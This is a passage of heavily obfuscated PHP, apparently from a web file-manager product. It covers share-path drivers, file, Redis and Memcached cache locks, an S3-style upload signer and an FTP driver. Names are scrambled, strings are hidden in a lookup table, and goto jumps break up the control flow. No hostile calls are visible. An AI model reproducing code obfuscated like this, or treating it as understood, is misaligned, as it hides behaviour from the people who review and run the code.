$ÇùÄæì± = Input::get($È›ã±²[554], $È›ã±²[7], $È›ã±²[1966], array($È›ã±²[2225], $È›ã±²[549])); $†«ñèßí = $ÌßÎËí . $È›ã±²[63] . $ÇùÄæì±; return $this->order($†«ñèßí); } private function _listAppendParent(&$ª’Ïİ±—) { $æ—¼¨ú½ =& $_SERVER[øşô´çË]; $üŠÇËö§ = array_unique(array_to_keyvalue($ª’Ïİ±—, $æ—¼¨ú½[12], $æ—¼¨ú½[2208])); $üŠÇËö§ = array_remove_value($üŠÇËö§, $æ—¼¨ú½[238]); if (!$üŠÇËö§) { return; } $æòåÓ›’ = $this->where(array($æ—¼¨ú½[2209] => array($æ—¼¨ú½[7], $üŠÇËö§)))->select(); $æòåÓ›’ = array_to_keyvalue($æòåÓ›’, $æ—¼¨ú½[2216]); foreach ($ª’Ïİ±— as &$Ø­¶•¥) { if (isset($æòåÓ›’[$Ø­¶•¥[$æ—¼¨ú½[2208]]])) { $Ø­¶•¥[$æ—¼¨ú½[2226]] = $æòåÓ›’[$Ø­¶•¥[$æ—¼¨ú½[2208]]]; } } unset($Ø­¶•¥); } private function _listAppendUser(&$Òê¾Š¢Ë) { $‹¨óÍ´¬ =& $_SERVER[øşô´çË]; $‹°ÉüÏ = array_unique(array_to_keyvalue($Òê¾Š¢Ë, $‹¨óÍ´¬[12], $‹¨óÍ´¬[1588])); $‹°ÉüÏ = array_remove_value($‹°ÉüÏ, $‹¨óÍ´¬[238]); if (count($‹°ÉüÏ) == 0) { return; } foreach ($Òê¾Š¢Ë as $ˆ­­ïÁï) { if (isset($ˆ­­ïÁï[$‹¨óÍ´¬[2226]])) { $‹°ÉüÏ[] = $ˆ­­ïÁï[$‹¨óÍ´¬[2226]][$‹¨óÍ´¬[1588]]; } } $ÂÍøö±ç = Model($‹¨óÍ´¬[626])->userListInfo($‹°ÉüÏ); foreach ($Òê¾Š¢Ë as &$ˆ­­ïÁï) { $ˆ­­ïÁï[$‹¨óÍ´¬[693]] = $ÂÍøö±ç[$ˆ­­ïÁï[$‹¨óÍ´¬[1588]]]; if (isset($ˆ­­ïÁï[$‹¨óÍ´¬[2226]])) { $ˆ­­ïÁï[$‹¨óÍ´¬[2226]][$‹¨óÍ´¬[693]] = $ÂÍøö±ç[$ˆ­­ïÁï[$‹¨óÍ´¬[2226]][$‹¨óÍ´¬[1588]]]; } } unset($ˆ­­ïÁï); } private function _listAppendMeta(&$Ò®­¦Õ‹) { $¿ƒşĞµ =& $_SERVER[øşô´çË]; $÷í³Üßà = array_unique(array_to_keyvalue($Ò®­¦Õ‹, $¿ƒşĞµ[12], $¿ƒşĞµ[2216])); $÷í³Üßà = array_remove_value($÷í³Üßà, $¿ƒşĞµ[238]); if (!$÷í³Üßà) { return; } foreach ($Ò®­¦Õ‹ as $¼§ú»òá) { if (isset($¼§ú»òá[$¿ƒşĞµ[2226]])) { $÷í³Üßà[] = $¼§ú»òá[$¿ƒşĞµ[2226]][$¿ƒşĞµ[2216]]; } } $Ò¯ö ²¥ = $this->metaList($÷í³Üßà); if (!$Ò¯ö ²¥) { return !1; } foreach ($Ò®­¦Õ‹ as &$¼§ú»òá) { $¼§ú»òá[$¿ƒşĞµ[564]] = $Ò¯ö ²¥[$¼§ú»òá[$¿ƒşĞµ[2216]]]; if (isset($¼§ú»òá[$¿ƒşĞµ[2226]])) { $¼§ú»òá[$¿ƒşĞµ[2226]][$¿ƒşĞµ[564]] = $Ò¯ö ²¥[$¼§ú»òá[$¿ƒşĞµ[2226]][$¿ƒşĞµ[2216]]]; } } unset($¼§ú»òá); } private function metaList($ÖÏƒÔ°) { $èá­´Æ‘ =& $_SERVER[øşô´çË]; if (!$ÖÏƒÔ°) { return array(); } $šÕò·–Ú = array($èá­´Æ‘[2216] => array($èá­´Æ‘[7], $ÖÏƒÔ°)); $­ñéš¼§ = Model($èá­´Æ‘[2227])->where($šÕò·–Ú)->select(); $­ñéš¼§ = array_to_keyvalue_group($­ñéš¼§, $èá­´Æ‘[2216]); foreach ($­ñéš¼§ as $É²‹Î÷ñ => $é’óÄå) { $¹ùï¶Ñ = array(); foreach ($é’óÄå as $³Ï‹ŠÈ±) { $¹ùï¶Ñ[$³Ï‹ŠÈ±[$èá­´Æ‘[105]]] = $³Ï‹ŠÈ±[$èá­´Æ‘[460]]; } $­ñéš¼§[$É²‹Î÷ñ] = $¹ùï¶Ñ; } return $­ñéš¼§ ? $­ñéš¼§ : array(); } public function removeTarget($Ó½»˜É©, $²”¹òÍ„) { $¸á·”­ò =& $_SERVER[øşô´çË]; if (!$²”¹òÍ„) { return !0; } $²”¹òÍ„ = is_array($²”¹òÍ„) ? $²”¹òÍ„ : array($²”¹òÍ„); $µõàÊıá = array($¸á·”­ò[198] => $Ó½»˜É©, $¸á·”­ò[598] => array($¸á·”­ò[7], $²”¹òÍ„)); $üÈÉÆ“ = $this->field($¸á·”­ò[2216])->where($µõàÊıá)->select(); $ò©Šã‰Û = array_to_keyvalue($üÈÉÆ“, $¸á·”­ò[12], $¸á·”­ò[2216]); return $this->removeArray($ò©Šã‰Û); } public function removeArray($‰¬ —¿) { $ßåÍ¬¶ =& $_SERVER[øşô´çË]; if (!$‰¬ —¿) { return !0; } $‰¬ —¿ = is_array($‰¬ —¿) ? $‰¬ —¿ : array($‰¬ —¿); $±Ò–¾¿ï = array($ßåÍ¬¶[2216] => array($ßåÍ¬¶[7], $‰¬ —¿)); Model($ßåÍ¬¶[2219])->where($±Ò–¾¿ï)->delete(); Model($ßåÍ¬¶[2228])->where($±Ò–¾¿ï)->delete(); return $this->where($±Ò–¾¿ï)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\154\x65\137\143\157\x6e\x74\145\x6e\164\x73"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\124\151\155\145", "\x74\151\155\145", "\151\x6e\x73\x65\x72\x74", "\x66\165\x6e\143\164\x69\x6f\x6e")); } goto E…«ñá‹¡›; EÖÍâÔÖ°¸: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¬…®ÙéÈ =& $_SERVER[øşô´çË]; $ÌÉ×É¯‰ = $GLOBALS[$¬…®ÙéÈ[6]][$¬…®ÙéÈ[433]]; self::$cachePath = $ÌÉ×É¯‰[$¬…®ÙéÈ[240]][$¬…®ÙéÈ[97]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($¬°á“ß, $¼µ»³©Ê = 0) { $Æ›Ø²úî =& $_SERVER[øşô´çË]; $œÚÎÙ¨¹ = microtime(!0); $ÉÕü˜Ò“ = $œÚÎÙ¨¹ + $¼µ»³©Ê + 0.0001; $Ú„‹¡±Ü = rtrim(self::$cachePath, $Æ›Ø²úî[8]) . $Æ›Ø²úî[1023] . md5($¬°á“ß) . $Æ›Ø²úî[1020]; if (file_exists($Ú„‹¡±Ü) && filemtime($Ú„‹¡±Ü) && filemtime($Ú„‹¡±Ü) < time() - 10) { @unlink($Ú„‹¡±Ü); } do { if (file_exists($Ú„‹¡±Ü)) { cacheLockWait(); continue; } $•ËšÊ´Ñ = fopen($Ú„‹¡±Ü, $Æ›Ø²úî[1024]); if (!$•ËšÊ´Ñ) { return !1; } $½ÓÏü = flock($•ËšÊ´Ñ, LOCK_EX | LOCK_NB); self::$caches[$¬°á“ß] = array($Æ›Ø²úî[1025] => $•ËšÊ´Ñ, $Æ›Ø²úî[240] => $Ú„‹¡±Ü); fwrite($•ËšÊ´Ñ, $ÉÕü˜Ò“); clearstatcache(); if ($•ËšÊ´Ñ && $½ÓÏü) { return !0; } cacheLockWait(); } while (microtime(!0) < $ÉÕü˜Ò“); $this->unlock($¬°á“ß); return !1; } public function lockGet($Ü¯†§š¿) { $Õ³¿÷­– =& $_SERVER[øşô´çË]; $Œóë­İ¤ = rtrim(self::$cachePath, $Õ³¿÷­–[8]) . $Õ³¿÷­–[1023] . md5($Ü¯†§š¿) . $Õ³¿÷­–[1020]; return file_exists($Œóë­İ¤); } public function unlock($ÖÄŞ„·’) { $¾â¾ãã =& $_SERVER[øşô´çË]; $ğÉ¾ê¼Ù = self::$caches[$ÖÄŞ„·’]; if (!$ğÉ¾ê¼Ù) { return; } @flock($ğÉ¾ê¼Ù[$¾â¾ãã[1025]], LOCK_UN); @fclose($ğÉ¾ê¼Ù[$¾â¾ãã[1025]]); @unlink($ğÉ¾ê¼Ù[$¾â¾ãã[240]]); unset(self::$caches[$ÖÄŞ„·’]); } } class CacheLockRedis { public function lock($ÛÔôû×‹, $Â´Éá = 10) { $‹ÏÇ°¬¿ = Cache::init(); $ò¾Á¶… = microtime(!0) + $Â´Éá; while (microtime(!0) < $ò¾Á¶…) { $©Ôüœ¼ = $‹ÏÇ°¬¿->get($ÛÔôû×‹); if (!$©Ôüœ¼) { $±†æ•øÚ = $‹ÏÇ°¬¿->setLock($ÛÔôû×‹, $ò¾Á¶…, $Â´Éá); if ($±†æ•øÚ) { return !0; } } else { if ($©Ôüœ¼ < microtime(!0)) { $‹ÏÇ°¬¿->set($ÛÔôû×‹, $ò¾Á¶…, $Â´Éá * 2); if ($‹ÏÇ°¬¿->get($ÛÔôû×‹) === $©Ôüœ¼) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ÚƒÜÃ÷) { return Cache::init()->get($ÚƒÜÃ÷); } public function unlock($¼Öíò©) { return Cache::init()->remove($¼Öíò©); } } class CacheLockMemcached { public function lock($½¢¬Õª—, $ÍÏ÷¶à¤ = 0) { $µÕÏ„¾ = Cache::init(); $â¶¬Û•á = microtime(!0) + $ÍÏ÷¶à¤; while (microtime(!0) < $â¶¬Û•á) { $şâÆÃÍÂ = $µÕÏ„¾->get($½¢¬Õª—); if (!$şâÆÃÍÂ || $şâÆÃÍÂ < microtime(!0)) { $ ¦³ú¶° = $µÕÏ„¾->handle->add($½¢¬Õª—, $â¶¬Û•á, $ÍÏ÷¶à¤); if ($ ¦³ú¶°) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¯ØÒÜé) { return Cache::init()->get($¯ØÒÜé); } public function unlock($‘ñ¶¿‘) { return Cache::init()->remove($‘ñ¶¿‘); } } goto DÙ‚íÜ‹å¿; a£‘²ª¨»Õ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($‹ëÁ•Ú™) { $this->pathParse = $‹ëÁ•Ú™; $this->model = Model($_SERVER[øşô´çË][1529]); } public function getPathRoot() { $…³–óŞ¨ =& $_SERVER[øşô´çË]; return KodIO::makeShare($this->pathParse[$…³–óŞ¨[496]], $this->pathParse[$…³–óŞ¨[1356]]); } public function getPathOuter($¼İ³Ê˜¼) { $ëİèë° =& $_SERVER[øşô´çË]; if (!$¼İ³Ê˜¼) { return $¼İ³Ê˜¼; } $ŸöœğÙ = $this->parse($¼İ³Ê˜¼); return trim(KodIO::makeShare($this->pathParse[$ëİèë°[496]], $ŸöœğÙ[$ëİèë°[496]]), $ëİèë°[8]); } public function isParentOf($÷´æâ“é, $öÏ‘•š›) { $ÓÀµ³Ï = IO::init($öÏ‘•š›); return $this->model->isParentOf($÷´æâ“é, $ÓÀµ³Ï->path); } protected function infoParse($Ï˜Ã‹™Ü, $ë‚Ï¨ = false, $‘´ÉâŠ = false) { $êËâ–Ôˆ =& $_SERVER[øşô´çË]; static $Ş¢‹òí = array(); $ã·ê¬‘Ë = $this->pathParse[$êËâ–Ôˆ[496]]; $ÁÔÛâö = trim($this->pathParse[$êËâ–Ôˆ[1352]], $êËâ–Ôˆ[8]); if (isset($Ş¢‹òí[$ÁÔÛâö]) && is_array($Ş¢‹òí[$ÁÔÛâö])) { return $Ş¢‹òí[$ÁÔÛâö]; } $ªÛâùî† = Action($êËâ–Ôˆ[1536])->sharePathInfo($ã·ê¬‘Ë, $ÁÔÛâö, $ë‚Ï¨); $Ş¢‹òí[$ÁÔÛâö] = $ªÛâùî†; return $ªÛâùî†; } public function infoFull($Á¾ØÂğÔ) { $ÍªÁğ—™ =& $_SERVER[øşô´çË]; $ãÀ½¬°½ = explode($ÍªÁğ—™[8], trim($Á¾ØÂğÔ, $ÍªÁğ—™[8])); if (count($ãÀ½¬°½) > 1) { $úĞÛ•˜Š = implode($ÍªÁğ—™[8], array_splice($ãÀ½¬°½, 1)); $ÑüŠåÔÉ = $this->model->pathInfoByPath($ãÀ½¬°½[0], $úĞÛ•˜Š); if (!$ÑüŠåÔÉ) { return !1; } $this->pathParse[$ÍªÁğ—™[1352]] = $ÑüŠåÔÉ[$ÍªÁğ—™[201]]; } return $this->infoParse($Á¾ØÂğÔ); } public function listAll($¦Âğ”ßÌ) { $˜‚Úëó» =& $_SERVER[øşô´çË]; $”µ‹˜¼± = IO::info($this->pathParse[$˜‚Úëó»[97]]); if (!$”µ‹˜¼±) { return array(); } $Í’ï¢¥‡ = $this->model->listAll($¦Âğ”ßÌ); $ÑÑƒ—î = Model($˜‚Úëó»[695])->getInfo($”µ‹˜¼±[$˜‚Úëó»[696]]); foreach ($Í’ï¢¥‡ as &$ùåÕ¥Ùå) { check_abort(); $ùåÕ¥Ùå[$˜‚Úëó»[100]] = Action($˜‚Úëó»[1536])->_shareItemeParse($ùåÕ¥Ùå[$˜‚Úëó»[100]], $ÑÑƒ—î); } unset($ùåÕ¥Ùå); return $Í’ï¢¥‡; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Ñµ¶Ò°) { $this->pathParse = $Ñµ¶Ò°; $this->model = Model($_SERVER[øşô´çË][1529]); } protected function infoParse($­µ€ÈËü, $–Æ»‚ú› = false, $ãÃñ‡Õ® = false) { $°‚èŒ¦” =& $_SERVER[øşô´çË]; return Action($°‚èŒ¦”[1359])->sharePathInfo($this->pathParse[$°‚èŒ¦”[97]], !0, $–Æ»‚ú›); } public function listPath($·áËü¬­, $‡ÄáÕÈ‚ = false) { $ÊùÄ•õ€ =& $_SERVER[øşô´çË]; $Ä˜ñ³ = parent::listPath($·áËü¬­, $‡ÄáÕÈ‚); if (!$Ä˜ñ³) { return $Ä˜ñ³; } if (is_array($Ä˜ñ³[$ÊùÄ•õ€[969]])) { $Ä˜ñ³[$ÊùÄ•õ€[969]] = Action($ÊùÄ•õ€[1359])->shareItemInfo($Ä˜ñ³[$ÊùÄ•õ€[969]]); } foreach ($Ä˜ñ³ as $­ı„ôë• => $÷í¼®àì) { if (!in_array($­ı„ôë•, array($ÊùÄ•õ€[96], $ÊùÄ•õ€[95]))) { continue; } foreach ($÷í¼®àì as $º…ªû  => $Ö´üã·) { $Ä˜ñ³[$­ı„ôë•][$º…ªû ] = Action($ÊùÄ•õ€[1359])->shareItemInfo($Ö´üã·); } } return $Ä˜ñ³; } public function listAll($›åëµˆş) { $áŞÖ¡Î¢ =& $_SERVER[øşô´çË]; $ÅÛ¶áÙÄ = IO::info($this->pathParse[$áŞÖ¡Î¢[97]]); if (!$ÅÛ¶áÙÄ) { return array(); } $Ô×ç¼ºë = $this->model->listAll($›åëµˆş); foreach ($Ô×ç¼ºë as &$¥¿áÚä) { $¥¿áÚä[$áŞÖ¡Î¢[100]] = Action($áŞÖ¡Î¢[1359])->shareItemInfo($¥¿áÚä[$áŞÖ¡Î¢[100]]); } unset($¥¿áÚä); return $Ô×ç¼ºë; } } class PathDriverDriverShareItem { public function __construct($ğò–Êãê) { $this->pathParse = $ğò–Êãê; } public function __call($Ì©±€, $Í³Í—Ç) { $íøÎÑ›‰ =& $_SERVER[øşô´çË]; if (method_exists($this, $Ì©±€)) { return; } $Ò’¢ŸÁ— = call_user_func_array(array($íøÎÑ›‰[1537], $Ì©±€), $Í³Í—Ç); $ãõ³Ì = array($íøÎÑ›‰[1538], $íøÎÑ›‰[1539], $íøÎÑ›‰[1540], $íøÎÑ›‰[1541], $íøÎÑ›‰[650], $íøÎÑ›‰[652], $íøÎÑ›‰[1542], $íøÎÑ›‰[117], $íøÎÑ›‰[1543], $íøÎÑ›‰[1544]); if (in_array($Ì©±€, $ãõ³Ì)) { $Ò’¢ŸÁ— = $this->getPathOuter($Ò’¢ŸÁ—); } return $Ò’¢ŸÁ—; } public function copy($üªÛè‚–, $—•Ó’õ­, $àæÎÌ÷Í = false, $´¤”¨¿ = false) { return $this->copyMove($üªÛè‚–, $—•Ó’õ­, $àæÎÌ÷Í, $_SERVER[øşô´çË][650], $´¤”¨¿); } public function move($¡ä„§Ö, $ö¼µò±Õ, $ûÏìØ—â = false, $¨ô¥ª„à = false) { return $this->copyMove($¡ä„§Ö, $ö¼µò±Õ, $ûÏìØ—â, $_SERVER[øşô´çË][652], $¨ô¥ª„à); } private function copyMove($ß‚ë‡óŸ, $’±¯ó™Ø, $èùªÖê, $Şë½—Š•, $øÔôâ»Ğ = false) { $ñÃ ÕÃ´ =& $_SERVER[øşô´çË]; $Ùıªç¥ = $’±¯ó™Ø; $•¼–ÚáÇ = IO::driverMake($’±¯ó™Ø); if ($•¼–ÚáÇ->pathParse[$ñÃ ÕÃ´[1333]]) { $’±¯ó™Ø = $•¼–ÚáÇ->pathParse[$ñÃ ÕÃ´[1333]]; } else { $’±¯ó™Ø = $Ùıªç¥; } $ĞÖœ»ãç = IO::copyMove($ß‚ë‡óŸ, $’±¯ó™Ø, $èùªÖê, $Şë½—Š•, $øÔôâ»Ğ); $ĞÖœ»ãç = $this->getPathOuter($ĞÖœ»ãç); return $ĞÖœ»ãç; } public function pathThis($üç ‹¥×) { return get_path_this($this->pathParse[$_SERVER[øşô´çË][97]]); } public function pathFather($Õ±öºú‡) { return get_path_father($this->pathParse[$_SERVER[øşô´çË][97]]); } public function iconvSystem($×Åğ¶¹Ò) { return $×Åğ¶¹Ò; } protected function infoParse($Å®ıÖŞ, $®®Ìğƒ™ = false) { $î›ùä‚ =& $_SERVER[øşô´çË]; $Õğ™ÙÉÈ = $this->pathParse[$î›ùä‚[585]][$î›ùä‚[592]] . $this->pathParse[$î›ùä‚[1352]]; if ($®®Ìğƒ™) { $ì„”Ëó = IO::infoWithChildren($Õğ™ÙÉÈ); } else { $ì„”Ëó = IO::info($Õğ™ÙÉÈ); } $ä…ÉûËÊ = $this->pathParse[$î›ùä‚[585]]; return Action($î›ùä‚[1536])->_shareItemeParse($ì„”Ëó, $ä…ÉûËÊ); } public function listAll($ÓçêÃ¢) { $ÀÆÄ×Ëú =& $_SERVER[øşô´çË]; $ô¾“¹­ = IO::listAll($ÓçêÃ¢); $Âüç¯ÍÓ = rtrim($this->pathParse[$ÀÆÄ×Ëú[585]][$ÀÆÄ×Ëú[592]], $ÀÆÄ×Ëú[8]); foreach ($ô¾“¹­ as &$ÒÂêÁæ¾) { $ÒÂêÁæ¾[$ÀÆÄ×Ëú[97]] = $this->pathDriver . $ÀÆÄ×Ëú[8] . ltrim(substr($ÒÂêÁæ¾[$ÀÆÄ×Ëú[97]], strlen($Âüç¯ÍÓ)), $ÀÆÄ×Ëú[8]); } unset($ÒÂêÁæ¾); return $ô¾“¹­; } public function listAllSimple($è½¼üïÂ, $½ññ¦ = false) { $µÁÎüä =& $_SERVER[øşô´çË]; $êîÃ´ô‰ = $this->listAll($è½¼üïÂ); $Ä›Ç¼à = $this->pathParse[$µÁÎüä[519]]; if (trim($Ä›Ç¼à, $µÁÎüä[8]) == trim(get_path_father($Ä›Ç¼à), $µÁÎüä[8])) { $½ññ¦ = !0; } return IO::init($µÁÎüä[12])->listAllSimpleMake($êîÃ´ô‰, $Ä›Ç¼à, $½ññ¦); } public function getPathOuter($¾øËö¿î) { $Ûû ‰ˆ® =& $_SERVER[øşô´çË]; $ÒÜ¡´Š = KodIO::parse($¾øËö¿î); if ($ÒÜ¡´Š[$Ûû ‰ˆ®[43]] == KodIO::KOD_SHARE_ITEM) { return $ÒÜ¡´Š[$Ûû ‰ˆ®[97]]; } $ªæÓÑ¤² = KodIO::clear($¾øËö¿î); $ÊÖ¢Ğ„÷ = KodIO::clear($this->pathParse[$Ûû ‰ˆ®[585]][$Ûû ‰ˆ®[592]]); $ÅÇÂÙ = substr($ªæÓÑ¤², strlen($ÊÖ¢Ğ„÷)); if (substr($ªæÓÑ¤², 0, strlen($ÊÖ¢Ğ„÷)) != $ÊÖ¢Ğ„÷) { return !1; } return $this->pathParse[$Ûû ‰ˆ®[1353]] . $Ûû ‰ˆ®[8] . ltrim($ÅÇÂÙ, $Ûû ‰ˆ®[8]); } public function getType() { $ô‰ßéÇÓ =& $_SERVER[øşô´çË]; $§‘¸Şåé = str_replace($ô‰ßéÇÓ[87], $ô‰ßéÇÓ[12], get_class($this)); return strtolower($§‘¸Şåé); } public function isOsDriver($’§ÒäŒ©) { return IO::isOsDriver($’§ÒäŒ©); } public function info($ÕäÚ„) { return $this->infoParse($ÕäÚ„); } public function infoAuth($á·••ù¤) { return $this->infoParse($á·••ù¤); } public function infoWithChildren($Õ¸áÌ²£) { return $this->infoParse($Õ¸áÌ²£, !0); } public function infoFull($ö¸àĞÊ‹) { return $this->infoParse($ö¸àĞÊ‹); } } goto BÒÄµš‰âå; E½‚×ˆä¤¤: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ÇºŞş©¤) { parent::__construct($ÇºŞş©¤); $this->setSignVersion($_SERVER[øşô´çË][257]); } public function uploadFormData($‚Æ³¾Š, $İú¯õœë = 3600) { $ªü®´ÉÄ =& $_SERVER[øşô´çË]; $‹Şıßı = $ªü®´ÉÄ[239]; $Èèó–¼˜ = $ªü®´ÉÄ[267]; $Øœ¯¢Áı = $ªü®´ÉÄ[72]; $„–‘“§À = gmdate($ªü®´ÉÄ[268]); $èù±€²Ş = gmdate($ªü®´ÉÄ[269]); $ÔÓñçùê = $ªü®´ÉÄ[270]; $â‚€ì¾ = $İú¯õœë . $ªü®´ÉÄ[12]; $·§Â¤¤ = $ªü®´ÉÄ[271]; $Ü×Œ¦” = array($this->accessKey, $èù±€²Ş, $this->region, $Øœ¯¢Áı, $ÔÓñçùê); $ú„÷´àä = implode($ªü®´ÉÄ[8], $Ü×Œ¦”); $½ã¡ÄıŠ = array($ªü®´ÉÄ[272] => gmdate($ªü®´ÉÄ[1521], strtotime($ªü®´ÉÄ[274])), $ªü®´ÉÄ[275] => array(array($ªü®´ÉÄ[276] => $this->bucket), array($ªü®´ÉÄ[315] => $‹Şıßı), array($ªü®´ÉÄ[277], $ªü®´ÉÄ[278], $ªü®´ÉÄ[12]), array($ªü®´ÉÄ[277], $ªü®´ÉÄ[279], $ªü®´ÉÄ[12]), array($ªü®´ÉÄ[277], $ªü®´ÉÄ[316], $ªü®´ÉÄ[12]), array($ªü®´ÉÄ[280] => $·§Â¤¤), array($ªü®´ÉÄ[281] => $ú„÷´àä), array($ªü®´ÉÄ[282] => $Èèó–¼˜), array($ªü®´ÉÄ[283] => $„–‘“§À), array($ªü®´ÉÄ[284] => $â‚€ì¾))); $ü¡ÎĞ– = base64_encode(json_encode($½ã¡ÄıŠ)); $Ù”Ï‹‡“ = hash_hmac($ªü®´ÉÄ[285], $èù±€²Ş, $ªü®´ÉÄ[286] . $this->secret, !0); $àÑØØé = hash_hmac($ªü®´ÉÄ[285], $this->region, $Ù”Ï‹‡“, !0); $ñ–®ƒÔ´ = hash_hmac($ªü®´ÉÄ[285], $Øœ¯¢Áı, $àÑØØé, !0); $µË½±‡ê = hash_hmac($ªü®´ÉÄ[285], $ÔÓñçùê, $ñ–®ƒÔ´, !0); $‚úÃ©» = hash_hmac($ªü®´ÉÄ[285], $ü¡ÎĞ–, $µË½±‡ê); $ñ£¨ÄêÜ = array($ªü®´ÉÄ[256] => $ªü®´ÉÄ[12], $ªü®´ÉÄ[303] => $ªü®´ÉÄ[12], $ªü®´ÉÄ[315] => $‹Şıßı, $ªü®´ÉÄ[280] => $·§Â¤¤, $ªü®´ÉÄ[287] => $ü¡ÎĞ–, $ªü®´ÉÄ[317] => $ú„÷´àä, $ªü®´ÉÄ[318] => $Èèó–¼˜, $ªü®´ÉÄ[319] => $„–‘“§À, $ªü®´ÉÄ[320] => $â‚€ì¾, $ªü®´ÉÄ[321] => $‚úÃ©», $ªü®´ÉÄ[216] => $this->getHost()); return $ñ£¨ÄêÜ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($Ö•ÁÂÃ¬) { parent::__construct(); if (count($Ö•ÁÂÃ¬) > 0) { $this->_init($Ö•ÁÂÃ¬); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($óùß½÷) { $Šà‡æËƒ =& $_SERVER[øşô´çË]; global $config; $this->appCharset = $config[$Šà‡æËƒ[1642]]; $this->systemCharset = $config[$Šà‡æËƒ[1643]]; if (isset($óùß½÷[$Šà‡æËƒ[1644]]) && $óùß½÷[$Šà‡æËƒ[1644]]) { $this->systemCharset = $óùß½÷[$Šà‡æËƒ[1644]]; } } public function iconvApp($‰‚‚ô×) { return $this->iconvTo($‰‚‚ô×, $this->systemCharset, $this->appCharset); } public function iconvSystem($À¢§´Š) { return $this->iconvTo($À¢§´Š, $this->appCharset, $this->systemCharset); } public function getPathOuter($±òœˆ·) { $ê¼„Å¼ô =& $_SERVER[øşô´çË]; $Íˆ›Ôáô = $this->iconvApp($this->pathBase); $±òœˆ· = $this->iconvApp($±òœˆ·); if (substr($Íˆ›Ôáô, 0, 2) == $ê¼„Å¼ô[1519]) { $Íˆ›Ôáô = BASIC_PATH . substr($Íˆ›Ôáô, 2); } if (substr($±òœˆ·, 0, 2) == $ê¼„Å¼ô[1519]) { $±òœˆ· = BASIC_PATH . substr($±òœˆ·, 2); } $Íˆ›Ôáô = KodIO::clear($Íˆ›Ôáô); $±òœˆ· = KodIO::clear($±òœˆ·); $±òœˆ· = substr($±òœˆ·, strlen($Íˆ›Ôáô)); if (empty($this->pathDriver)) { return $±òœˆ·; } return $this->pathDriver . $ê¼„Å¼ô[8] . ltrim($±òœˆ·, $ê¼„Å¼ô[8]); } private function _init($ëœ®Ş¢ = array()) { $Ô©ßöĞ„ =& $_SERVER[øşô´çË]; if (!function_exists($Ô©ßöĞ„[1645])) { throw new Exception(LNG($Ô©ßöĞ„[1646])); } $this->config = $ëœ®Ş¢; $this->charsetReset($ëœ®Ş¢); foreach ($ëœ®Ş¢ as $‘ì…“†ü => $ñäñÆ¡ ) { if (isset($this->{$‘ì…“†ü})) { $this->{$‘ì…“†ü} = $ñäñÆ¡ ; } } return $this->_login($ëœ®Ş¢); } private function _login($ÔøòíĞ„) { $àÄôèş =& $_SERVER[øşô´çË]; static $¼¤‘âßÇ = array(); $œ÷××Ã = md5(json_encode($ÔøòíĞ„)); if (isset($¼¤‘âßÇ[$œ÷××Ã])) { foreach ($¼¤‘âßÇ[$œ÷××Ã] as $¤Ê¬¼­” => $¦º¡®¥Ñ) { $this->{$¤Ê¬¼­”} = $¦º¡®¥Ñ; } return !0; } $§„·€¯Ù = parse_url(trim($this->server, $àÄôèş[8])); $this->host = $§„·€¯Ù[$àÄôèş[216]]; $Â ¿«¢ö = isset($§„·€¯Ù[$àÄôèş[215]]) && $§„·€¯Ù[$àÄôèş[215]] == $àÄôèş[1647] ? !0 : !1; $this->scheme = $Â ¿«¢ö ? $àÄôèş[1648] : $àÄôèş[1649]; $this->port = isset($§„·€¯Ù[$àÄôèş[217]]) ? $§„·€¯Ù[$àÄôèş[217]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($àÄôèş[1650]) . $this->host . $àÄôèş[4] . $this->port, !0); return !1; } $¶ÒÙ» = @ftp_login($this->connect, $this->username, $this->userpass); if (!$¶ÒÙ») { $this->writeLog(LNG($àÄôèş[1651]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $àÄôèş[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $õÆ˜²¹ğ = $this->pasv == $àÄôèş[101] ? !0 : !1; @ftp_pasv($this->connect, $õÆ˜²¹ğ); $¼¤‘âßÇ[$œ÷××Ã] = array($àÄôèş[1652] => $this->connect, $àÄôèş[216] => $this->host, $àÄôèş[215] => $this->scheme, $àÄôèş[217] => $this->port); return $¶ÒÙ»; } private function _isconn($„€Õ€ØÈ = true) { if (is_resource($this->connect)) { return !0; } if (!$„€Õ€ØÈ) { return !1; } return $this->_login($this->config); } public function mkfile($ìÄ˜óş, $ˆï·Œ¥© = '', $ÊÕÓ—•ë = REPEAT_RENAME) { if ($this->setContent($ìÄ˜óş, $ˆï·Œ¥©)) { return $this->getPathOuter($ìÄ˜óş); } $this->writeLog(LNG($_SERVER[øşô´çË][1653]), !0); return !1; } public function mkdir($°Ê‰‘÷, $¯âË«şŸ = REPEAT_SKIP) { $´ŞıËó =& $_SERVER[øşô´çË]; if (!$°Ê‰‘÷ || $°Ê‰‘÷ == $´ŞıËó[8]) { return !0; } if (!$this->_isconn()) { return !1; } $°Ê‰‘÷ = $this->iconvSystem($°Ê‰‘÷); if ($this->_isFolder($°Ê‰‘÷) || @ftp_mkdir($this->connect, $°Ê‰‘÷)) { return $this->getPathOuter($°Ê‰‘÷); } if (!$this->mkdir($this->pathFather($°Ê‰‘÷))) { return !1; } if ($°Ê‰‘÷ = @ftp_mkdir($this->connect, $°Ê‰‘÷)) { return $this->getPathOuter($°Ê‰‘÷); } $çÛÃà‘ı = __FUNCTION__ . $´ŞıËó[1654]; $this->writeLog($çÛÃà‘ı, !0); return !1; } public function copyFile($©ƒŒ°‚, $Àå°—æó) { if (!$this->_isconn()) { return !1; } $¦¹ğÏ‡¢ = $this->pathThis($this->iconvSystem($©ƒŒ°‚)); $¿íª·•ƒ = $this->tempFile($¦¹ğÏ‡¢); $ÒÃÚáİ‚ = 